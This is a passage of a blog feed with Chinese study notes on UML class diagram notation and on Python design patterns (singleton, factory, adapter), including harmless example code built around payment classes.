    <content type="html"><![CDATA[<blockquote><p>UML图是软件工程建模中对程序设计描述的设计图类的总称，可以让我们更清晰的了解项目的结构。</p><p>常见UML图包含类图、对象图、组件图、部署图、用例图等结构行为图以及序列图、协作图、状态图、活动图等动态行为图，想要拓展的可以参考网上博客—&gt;<a href="https://www.cnblogs.com/hzxll/p/16190230.html">九种常见UML图</a> </p><p>本文是最常用的UML类图的笔记</p></blockquote><h2 id="一、UML类图简介"><a href="#一、UML类图简介" class="headerlink" title="一、UML类图简介"></a><strong>一、UML类图简介</strong></h2><p>类图以反映类的结构(<strong>属性、操作</strong>)以及类之间的关系为主要目的，描述了软件系统的结构，是一种静态建模方法。类图用来<strong>描述系统中有意义的概念</strong>，包括具体的概念、抽象的概念、实现方面的概念等，是对现实世界中事物的<strong>抽象</strong>。类图的主要作用是对系统的词汇进行建模、对简单的协作进行建模和对逻辑数据库模式进行建模。</p><h1 id="二-、类图的基本属性"><a href="#二-、类图的基本属性" class="headerlink" title="二 、类图的基本属性"></a>二 、类图的基本属性</h1><p>类图概括起来主要由两部分组成：类和类之间的关系，</p><p>其中对类的定义如下图所示</p><p>主要由三部分组成，它们分别是<strong>类名</strong>、<strong>类的属性</strong>、<strong>类的方法</strong>，对应图中的三个分区内容。</p><p><img src="/img/uml/1.jpg" alt="1"> </p><ul><li><p><strong>类名</strong>：图中最上面的矩形框中为类名。如果字体为<em>斜体</em>，表示为抽象类</p></li><li><p><strong>类的属性</strong>：类名下方的区域<strong>·类的方法</strong>：图中的下面部分</p></li><li><p>*<strong>符号解释</strong> 说明：属性和方法前面的“+” “-” 和 “#” 表示访问级别，以下对这些符号进行解释说明。</p><ul><li>‘+’ ： public，公用的，对所有类可见</li><li>‘-’ ： private，私有的，只对该类本身可用</li><li>‘#’： protected，受保护的，对该类的子孙可见</li><li>‘~’：package，包的，只对同一包声明的其他类可见</li><li>‘&#x3D;’：表示默认值</li><li>下划线：static</li><li>斜体：抽象 (注意也可以用两个尖括号包裹来表示抽象，比如 —— &lt;&lt;我是抽象类or接口&gt;&gt;)</li><li>冒号前是方法名&#x2F;变量名（根据有无括号区分），冒号后是返回参数&#x2F;变量类型（根据有无括号区分），如果没有冒号的话表示方法返回空（也有人通过：void表示返空）</li></ul></li></ul><h1 id="三、类之间的关系"><a href="#三、类之间的关系" class="headerlink" title="三、类之间的关系"></a>三、类之间的关系</h1><p>类之间的关系主要包括泛化（继承）、依赖、关联、聚合、组合和实现6种关系，下面对它们进行一一阐释。</p><p><img src="/img/uml/2.jpg" alt="2"></p><h2 id="1、泛化关系"><a href="#1、泛化关系" class="headerlink" title="1、泛化关系"></a><strong>1、泛化关系</strong></h2><p>泛化关系是一种<strong>继承</strong>关系，子类继承父类的所有行为和属性，子类可以新增新的功能或者重写父类功能，表示的方式为：<strong>空心三角+实线，箭头端指向父类</strong></p><p><img src="/img/uml/3.jpg" alt="3"></p><h2 id="2、依赖关系"><a href="#2、依赖关系" class="headerlink" title="2、依赖关系"></a><strong>2、依赖关系</strong></h2><p>依赖关系表示一个类使用（依赖）另一个类的服务或信息。当一个类的改变会影响到另一个类时，两个类之间存在依赖关系。一般来说，依赖总是单向的，不应该存在双向依赖。表示方式为：<strong>尖括号+虚线</strong>，</p><p><img src="/img/uml/4.jpg" alt="4"></p><h2 id="3、关联关系"><a href="#3、关联关系" class="headerlink" title="3、关联关系"></a><strong>3、关联关系</strong></h2><p>关联关系是一种拥有的关系，他使一个类知道另一个类的属性和方法。它体现不同类的一种强依赖关系，比如我和我的朋友，这种关系依赖更强，不存在依赖关系中的偶然性，关系也不是临时的，一般是长期性的。</p><p>关联关系分为单向关联或双向关联，也可以有多重性（一对多），双向的关联可以有两个箭头或者没有剪头，单向的关联有一个箭头，</p><p>表示方法：<strong>尖括号+实线，箭头指向被拥有者</strong></p><p><img src="/img/uml/5.jpg" alt="5"></p><h2 id="4、聚合关系"><a href="#4、聚合关系" class="headerlink" title="4、聚合关系"></a><strong>4、聚合关系</strong></h2><p>聚合关系是关联关系的一种，表示一种  “<strong>弱</strong>” 的 <strong>“拥有”</strong> 关系，<strong>是整体与部分的关系</strong>，且<strong>部分可以离开整体而单独存在</strong>，如车和轮胎是整体和部分的关系，轮胎离开车仍然可以单独存在，</p><p>表示方法：<strong>空心菱形+实线，菱形指向整体</strong> </p><p><img src="/img/uml/6.jpg" alt="6"></p><h2 id="5、组合关系"><a href="#5、组合关系" class="headerlink" title="5、组合关系"></a><strong>5、组合关系</strong></h2><p>组合关系也是<strong>关联关系</strong>的一种，是比聚合关系还要强的关系，<strong>是整体与个体的关系</strong>，但<strong>个体不能离开整体而单独存在</strong>，如公司和部门是整体和部分的关系，没有公司就不存在部门，它要求普通的聚合关系钟代表整体的对象负责代表部分的对象的生命周期。 </p><p>表示方法：<strong>实心菱形+实线</strong></p><p><img src="/img/uml/7.jpg" alt="7"></p><h2 id="6、实现关系"><a href="#6、实现关系" class="headerlink" title="6、实现关系"></a><strong>6、实现关系</strong></h2><p>实现关系是一种类与接口的关系，表示类是接口所有特征和行为的实现。</p><p>表示方法：<strong>空心三角+虚线</strong></p><p><img src="/img/uml/8.jpg" alt="8"></p><h1 id="四、类图模板案例"><a href="#四、类图模板案例" class="headerlink" title="四、类图模板案例"></a><strong>四、类图模板案例</strong></h1><p>为了更好的理解类之间的6种关系，下面使用例子辅助学习和消化吸收</p><h3 id="1、汽车类图案例"><a href="#1、汽车类图案例" class="headerlink" title="1、汽车类图案例"></a>1、汽车类图案例</h3><p><img src="/img/uml/9.jpg" alt="9"></p><p>汽车类图说明：</p><ul><li>车与小汽车和自行车之间是「实现」 关系，使用带空心箭头的虚线表示；</li><li>小汽车与SUV之间的关系为泛化关系，使用带空心箭头的实线表示；</li><li>小汽车与发动机和轮胎之间是「组合」 关系，使用实心菱形箭头的实线表示；</li><li>学生上学需要用到自行车，与自行车是一种「依赖」 关系，使用带箭头的虚线表示。</li><li>学生与班级之间是「聚合」 关系，使用带空心菱形箭头的实线表示；</li><li>学生与身份证之间为「关联」 关系，使用尖箭头的实线表示；</li></ul><h3 id="2、动物UML类图案例"><a href="#2、动物UML类图案例" class="headerlink" title="2、动物UML类图案例"></a>2、动物UML类图案例</h3><p><img src="/img/uml/10.jpg" alt="10"></p><h3 id="3、学生上网UML类图案例"><a href="#3、学生上网UML类图案例" class="headerlink" title="3、学生上网UML类图案例"></a>3、学生上网UML类图案例</h3><p><img src="/img/uml/11.jpg" alt="11"></p><h3 id="4、微信支付类图案例"><a href="#4、微信支付类图案例" class="headerlink" title="4、微信支付类图案例"></a>4、微信支付类图案例</h3><p><img src="/img/uml/12.jpg" alt="12"></p><p>如果你能快速的看懂并理解以上案例，说明你基本上已经把类图弄懂了，再去多结合一些代码和对应的类图巩固一下，以后再看到类图就不会懵了。</p><h2 id="五、如何绘制类图？"><a href="#五、如何绘制类图？" class="headerlink" title="五、如何绘制类图？"></a><strong>五、如何绘制类图？</strong></h2><p>新手推荐 ProcessOn （浏览器就可以免费使用）</p><p>mac用户推荐下载：astah professional</p>]]></content>
    
    
    <categories>
      
      <category>other</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>UML</tag>
      
      <tag>视野</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【python】之设计模式【未完】</title>
    <link href="/2024/02/23/699python%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    <url>/2024/02/23/699python%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h1 id="第1章-简介"><a href="#第1章-简介" class="headerlink" title="第1章 简介"></a>第1章 简介</h1><h2 id="1-1-面向对象相关"><a href="#1-1-面向对象相关" class="headerlink" title="1.1 面向对象相关"></a>1.1 面向对象相关</h2><h2 id="1-2-面相对象的3个设计设计原则"><a href="#1-2-面相对象的3个设计设计原则" class="headerlink" title="1.2 面相对象的3个设计设计原则"></a>1.2 面相对象的3个设计设计原则</h2><h1 id="第2章–单例设计模式【创建型模式】"><a href="#第2章–单例设计模式【创建型模式】" class="headerlink" title="第2章–单例设计模式【创建型模式】"></a>第2章–单例设计模式【创建型模式】</h1><h2 id="2-1-理解单例1"><a href="#2-1-理解单例1" class="headerlink" title="2.1 理解单例1"></a>2.1 理解单例1</h2><h3 id="2-1-1实现单例-–代码解读"><a href="#2-1-1实现单例-–代码解读" class="headerlink" title="2.1.1实现单例 –代码解读"></a>2.1.1实现单例 –代码解读</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 单例模式</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">cls</span>): <span class="hljs-comment"># __new__是在实例化的时候调用的方法</span><br>        <span class="hljs-string">&quot;&quot;&quot; 判断cls类是否具有instance实例属性，如果没有就创建一个实例出来&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">hasattr</span>(cls, <span class="hljs-string">&#x27;instance&#x27;</span>): <span class="hljs-comment"># 如果cls类本身 没有实例</span><br>            <span class="hljs-string">&quot;&quot;&quot; </span><br><span class="hljs-string">            这里比较难理解，</span><br><span class="hljs-string">            super(Singleton, cls)会返回Singleton类的父类object的对象</span><br><span class="hljs-string">            super(Singleton, cls).__new__(cls)也就是父类object的对象的__new__方法，</span><br><span class="hljs-string">            用父类的对象创建一个对象传递给cls（本类）</span><br><span class="hljs-string">            然后本类cls.instance就=父类对象创建出来的对象，</span><br><span class="hljs-string">            &quot;&quot;&quot;</span><br>            cls.instance = <span class="hljs-built_in">super</span>(Singleton, cls).__new__(cls) <span class="hljs-comment"># 那类的实例就等于</span><br><br>        <span class="hljs-keyword">return</span> cls.instance <span class="hljs-comment"># 如果有就直接返回这个实例cls.instance类的实例</span><br><br>s = Singleton()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Object created&quot;</span>, s) <span class="hljs-comment"># Object created &lt;__main__.Singleton object at 0x7ffbc212fbe0&gt;</span><br><br>s1 = Singleton()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Object created&quot;</span>, s1) <span class="hljs-comment"># Object created &lt;__main__.Singleton object at 0x7ffbc212fbe0&gt;</span><br><span class="hljs-comment"># 在 Python 中，对象的实例化过程包括两个步骤：__new__() 和 __init__()。__new__() 方法负责创建实例对象，而 __init__() 方法负责初始化实例。</span><br><span class="hljs-comment"># 在这个代码段中，super(Singleton, cls).__new__(cls) 使用了 super() 内置函数来调用父类 object 的 __new__() 方法。通过传递 Singleton 类和 cls 参数，super(Singleton, cls) 返回了一个代表父类的特殊对象。</span><br><br><span class="hljs-comment"># 然后，通过调用 __new__() 方法，父类 object 创建了一个新的实例对象。这个新的实例对象是通过传递 cls 参数（即 Singleton 类本身）给 __new__() 方法来创建的。</span><br><br><span class="hljs-comment"># 最后，将这个新创建的实例对象赋值给类属性 instance，以便后续的调用可以返回同一个实例。</span><br><br><span class="hljs-comment"># 换句话说，这行代码的目的是在首次实例化时创建一个新的实例，并将其赋值给类属性 instance，以便后续的实例化都返回该实例。</span><br></code></pre></td></tr></table></figure><p>问：如何实现单例模式：</p><p>答：通过在定义类魔法方法__–new–__里面，做一个判断，判断 当前类是否存在实例化对象也就是cls.instance 如果有，就直接返回这个实例化对象，如果没有则通过super调用父类的new方法来创建一个实例 cls.instance &#x3D; super(Singleton, cls).<strong>new</strong>(cls)) 然后再返回出去</p><p>UML类图简单学习笔记</p><blockquote><p>设计模式三大类—&gt;创建型、结构型、行为型</p></blockquote><h1 id="创建型"><a href="#创建型" class="headerlink" title="创建型"></a>创建型</h1><blockquote><p>怎么去创建一个对象， 工厂方法模式、抽象工厂模式、创建者模式、原型模式、单例模式</p></blockquote><h2 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h2><h3 id="简单工厂模式"><a href="#简单工厂模式" class="headerlink" title="简单工厂模式"></a>简单工厂模式</h3><p>不直接向客户端暴露对象创建的实现细节，而是通过一个工厂类来负责创建产品类的实例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">python设计模式之工厂模式</span><br><span class="hljs-string">不直接向客户端暴露对象创建的实现细节，而是通过一个工厂类来负责创建产品类的实例</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> abc <span class="hljs-keyword">import</span> ABCMeta, abstractmethod<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Payment</span>(metaclass=ABCMeta):<br><span class="hljs-meta">    @abstractmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">pay</span>(<span class="hljs-params">self, money</span>):<br>        <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Alipay</span>(<span class="hljs-title class_ inherited__">Payment</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, us_huabei=<span class="hljs-literal">False</span></span>):<br>        self.us_huabei = us_huabei<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">pay</span>(<span class="hljs-params">self, money</span>):<br>        <span class="hljs-keyword">if</span> self.us_huabei:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;花呗支付<span class="hljs-subst">&#123;money&#125;</span>元&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;支付宝支付<span class="hljs-subst">&#123;money&#125;</span>元&quot;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">WechatPay</span>(<span class="hljs-title class_ inherited__">Payment</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">pay</span>(<span class="hljs-params">self, money</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;微信支付<span class="hljs-subst">&#123;money&#125;</span>元&quot;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PaymentFactory</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_payment</span>(<span class="hljs-params">self, method</span>):<br>        <span class="hljs-keyword">if</span> method == <span class="hljs-string">&quot;alipay&quot;</span>:<br>            <span class="hljs-keyword">return</span> Alipay()<br>        <span class="hljs-keyword">elif</span> method == <span class="hljs-string">&quot;wechatpay&quot;</span>:<br>            <span class="hljs-keyword">return</span> WechatPay()<br>        <span class="hljs-keyword">elif</span> method == <span class="hljs-string">&quot;huabei&quot;</span>:<br>            <span class="hljs-keyword">return</span> Alipay(us_huabei=<span class="hljs-literal">True</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">raise</span> TypeError(<span class="hljs-string">f&quot;no such payment named <span class="hljs-subst">&#123;method&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pf = PaymentFactory()<br>    p = pf.create_payment(method=<span class="hljs-string">&quot;alipay&quot;</span>)<br>    p.pay(<span class="hljs-number">100</span>)<br><br></code></pre></td></tr></table></figure><p>类不直接实例化，由工厂类去返回对应的实例化对象</p><h3 id="工厂方法模式"><a href="#工厂方法模式" class="headerlink" title="工厂方法模式"></a>工厂方法模式</h3><p>工厂方法模式</p><p>优点:</p><ul><li>每个具体产品都对应一个具体工厂类，不需要修改工厂类代码</li><li>隐藏了对象创建的实现细节3</li></ul><p>缺点：</p><ul><li>每增加一个具体产品类，就必须增加一个相应的具体工厂类</li></ul><p>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> abc <span class="hljs-keyword">import</span> ABCMeta, abstractmethod<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Payment</span>(metaclass=ABCMeta):<br><span class="hljs-meta">    @abstractmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">pay</span>(<span class="hljs-params">self, money</span>):<br>        <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Alipay</span>(<span class="hljs-title class_ inherited__">Payment</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, use_huabei=<span class="hljs-literal">False</span></span>):<br>        self.us_huabei = use_huabei<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">pay</span>(<span class="hljs-params">self, money</span>):<br>        <span class="hljs-keyword">if</span> self.us_huabei:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;花呗支付<span class="hljs-subst">&#123;money&#125;</span>元&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;支付宝支付<span class="hljs-subst">&#123;money&#125;</span>元&quot;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BankPay</span>(<span class="hljs-title class_ inherited__">Payment</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">pay</span>(<span class="hljs-params">self, money</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;银联支付<span class="hljs-subst">&#123;money&#125;</span>元&quot;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">WechatPay</span>(<span class="hljs-title class_ inherited__">Payment</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">pay</span>(<span class="hljs-params">self, money</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;微信支付<span class="hljs-subst">&#123;money&#125;</span>元&quot;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PaymentFactory</span>(metaclass=ABCMeta):<br><span class="hljs-meta">    @abstractmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_payment</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AlipayFactory</span>(<span class="hljs-title class_ inherited__">PaymentFactory</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_payment</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> Alipay()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">WechatPayFactory</span>(<span class="hljs-title class_ inherited__">PaymentFactory</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_payment</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> WechatPay()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">HuabeiFactory</span>(<span class="hljs-title class_ inherited__">PaymentFactory</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_payment</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> Alipay(use_huabei=<span class="hljs-literal">True</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BankPayFactory</span>(<span class="hljs-title class_ inherited__">PaymentFactory</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_payment</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> BankPay()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pf = HuabeiFactory()<br>    p = pf.create_payment()<br>    p.pay(<span class="hljs-number">100</span>)<br></code></pre></td></tr></table></figure><h3 id="抽象工厂模式"><a href="#抽象工厂模式" class="headerlink" title="抽象工厂模式"></a>抽象工厂模式</h3><ul><li>内容:定义一个工厂类接口，让工厂子类来创建一系列相关或相互依赖的对象。</li><li>例:生产一部手机，需要手机壳、CPU、操作系统三类对象进行组装其中每类对象都有不同的种类。对每个具体工厂，分别生产一部手机所需要的三个对象。</li><li>相比工厂方法模式，抽象工厂模式中的每个具体工厂都生产一套产品。</li></ul><h2 id="建造者模式"><a href="#建造者模式" class="headerlink" title="建造者模式"></a>建造者模式</h2><ul><li>内容:将一个复杂对象的构建与它的表示分离，使得同样的构建过程可以创建不同的表示。</li><li>角色<ul><li>抽象建造者(Builder)</li><li>具体建造者(Concrete Builder)</li><li>指挥者(Director)</li><li>产品(Product)</li></ul></li><li>建造者模式与抽象工厂模式相似，也用来创建复杂对象。主要区别是建造者模式着重一步步构造一个复杂对象，而抽象工厂模式着重于多个系列的产品对象</li><li>优点<ul><li>隐藏了一个产品的内部结构和装配过程</li><li>将构造代码与表示代码分开</li><li>可以对构造过程进行更精细的控制</li></ul></li></ul><h2 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h2><p>确保一个类只会创建出一个对象，并提供一个访问他的全局访问点</p><ul><li>角色<ul><li>单例(Singleton)</li></ul></li><li>优点<ul><li>对唯一实例的受控访问</li><li>单例相当于全局变量，但防止了命名空间被污染—&gt;不用单例也可以</li></ul></li></ul><p>一般日志系统会是单例，不然两个日志对象同时操作一个文件对象，会出现问题，</p><blockquote><p>抽象工厂模式和建造者模式相对比简单工厂模式和工厂方法模式而言更灵活也更复杂</p><p>通常情况下、设计以简单工厂模式或工厂方法模式开始，当你发现设计需要更大的灵活性时，则像更复杂的设计模式演变</p><p>——-设计应当从简单开始，简单无法满足时才考虑复杂设计模式</p></blockquote><h1 id="结构型模式"><a href="#结构型模式" class="headerlink" title="结构型模式"></a>结构型模式</h1><h2 id="适配器模式"><a href="#适配器模式" class="headerlink" title="适配器模式"></a>适配器模式</h2><ul><li>内容:将一个类的接口转换成客户希望的另一个接口。适配器模式使得原本由于接口不兼容而不能一起工作的那些类可以一起工作。</li><li>两种实现方式<ul><li>类适配器：使用多继承</li><li>对象适配器：使用组合</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> abc <span class="hljs-keyword">import</span> ABCMeta, abstractmethod<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Payment</span>(metaclass=ABCMeta):<br><span class="hljs-meta">    @abstractmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">pay</span>(<span class="hljs-params">self, money</span>):<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Alipay</span>(<span class="hljs-title class_ inherited__">Payment</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">pay</span>(<span class="hljs-params">self, money</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;支付宝支付<span class="hljs-subst">&#123;money&#125;</span>元&quot;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">WechatPay</span>(<span class="hljs-title class_ inherited__">Payment</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">pay</span>(<span class="hljs-params">self, money</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;微信支付<span class="hljs-subst">&#123;money&#125;</span>元&quot;</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BankPay</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cast</span>(<span class="hljs-params">self, money</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;银联支付<span class="hljs-subst">&#123;money&#125;</span>元&quot;</span>)<br><br><span class="hljs-comment"># 类适配器</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">NewBankPay</span>(Payment, BankPay):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">pay</span>(<span class="hljs-params">self, money</span>):<br>        self.cast(money)<br>p = NewBankPay()<br>p.pay(<span class="hljs-number">100</span>)<br><br><span class="hljs-comment"># 对象适配器</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PaymentAdapter</span>(<span class="hljs-title class_ inherited__">Payment</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, payment</span>):<br>        self.payment = payment<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">pay</span>(<span class="hljs-params">self, money</span>):<br>        self.payment.cast(money)<br><br>p = PaymentAdapter(BankPay())<br>p.pay(<span class="hljs-number">100</span>)<br><br></code></pre></td></tr></table></figure><ul><li>角色:<ul><li>目标接口(Target)</li><li>待适配的类(Adaptee)</li><li>适配器(Adapter)</li></ul></li><li>适用场景</li><li>想使用一个已经存在的类，而它的接口不符合你的要求</li><li>(对象适配器)想使用一些已经存在的子类，但不可能对每一个都进行子类化以匹配它们的接口。对象适配器可以适配它的父类接口。</li></ul><h2 id="桥模式"><a href="#桥模式" class="headerlink" title="桥模式"></a>桥模式</h2><h1 id="行为型模式"><a href="#行为型模式" class="headerlink" title="行为型模式"></a>行为型模式</h1>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【linux】Ubuntu上使用Charles</title>
    <link href="/2024/02/23/904Ubuntu%E4%B8%8A%E4%BD%BF%E7%94%A8Charles/"/>
    <url>/2024/02/23/904Ubuntu%E4%B8%8A%E4%BD%BF%E7%94%A8Charles/</url>
    
